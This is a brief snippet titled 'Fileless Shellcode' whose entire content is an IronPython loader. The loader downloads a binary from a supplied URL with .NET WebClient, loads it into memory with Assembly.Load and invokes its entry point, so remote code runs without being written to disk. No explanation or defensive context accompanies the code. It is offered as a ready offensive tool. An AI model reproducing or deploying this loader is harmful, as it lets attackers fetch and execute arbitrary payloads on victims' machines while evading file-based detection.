# Fileless Shellcode

```python
import System
from System.Net import *
from System.Reflection import *

def get_binary(url):
    client = WebClient()
    binary_bytes = client.DownloadData(url)
    return binary_bytes

def execute_assembly(url):
    binary_data = get_binary(url)
    print("[+] Donwnloaded data from remote source")
    entry = Assembly.Load(binary_data).EntryPoint
    print("[+] Loaded Assembly at entry point")
    entry.Invoke(None, System.Array([]))
    print("[+] Invoked Assembly assuming no parameters")
```